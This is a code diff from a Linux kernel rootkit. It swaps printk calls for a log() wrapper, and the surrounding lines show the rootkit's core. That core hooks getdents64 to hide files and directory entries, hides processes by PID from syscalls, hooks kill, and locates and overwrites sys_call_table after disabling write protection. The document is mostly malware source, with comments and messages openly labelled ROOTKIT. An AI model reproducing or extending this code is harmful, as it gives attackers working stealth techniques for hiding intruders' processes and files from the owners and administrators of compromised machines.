@@ -159,7 +159,7 @@ asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __
 			del = true;
 
 		if (del){
-			//printk(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
+			//log(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
 			// Copies the rest of the buffer to the position of the current entry
 			deleted_size = currnt->d_reclen;
 			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen);
@@ -174,7 +174,7 @@ asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __
 int check_pid_in_pathname(const char __user *pathname, const char* syscall_caller){
 	int pid;
 	if ((pid = pathname_includes_pid(pathname)) > 0){
-		printk(KERN_INFO "ROOTKIT: Hidden process %d from call to %s\n", pid, syscall_caller);
+		log(KERN_INFO "ROOTKIT: Hidden process %d from call to %s\n", pid, syscall_caller);
 		return -1;
 	}
 	return 0;
@@ -182,7 +182,7 @@ int check_pid_in_pathname(const char __user *pathname, const char* syscall_calle
 
 int check_pid(int pid, const char* syscall_caller){
 	if (is_pid_hidden(pid)){
-		printk(KERN_INFO "ROOTKIT: Hidden process %d from call to %s\n", pid, syscall_caller);
+		log(KERN_INFO "ROOTKIT: Hidden process %d from call to %s\n", pid, syscall_caller);
 		return -1;
 	}
 	return 0;
@@ -257,11 +257,11 @@ asmlinkage long sys_kill_do_hook(pid_t pid, int sig, const struct pt_regs* regs)
 //__init para que solo lo haga una vez y después pueda sacarlo de memoria
 int __init hooks_init(void){
 	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == 0){
-		printk(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
+		log(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
 		return -1;
 	}
-	printk(KERN_INFO "ROOTKIT: Syscall table found at %lx\n", (long unsigned int)syscall_table);
-	printk(KERN_INFO "ROOTKIT: Starting hooks\n");
+	log(KERN_INFO "ROOTKIT: Syscall table found at %lx\n", (long unsigned int)syscall_table);
+	log(KERN_INFO "ROOTKIT: Starting hooks\n");
 
 	ENABLE_WRITE(); //there must be a way to do this better
 	perform_hook(getdents, GETDENTS)
@@ -281,7 +281,7 @@ int __init hooks_init(void){
 	perform_hook(kill, KILL);
 	DISABLE_WRITE();
 
-	printk(KERN_INFO "ROOTKIT: Finished hooks\n");
+	log(KERN_INFO "ROOTKIT: Finished hooks\n");
 	return 0;
 }
 
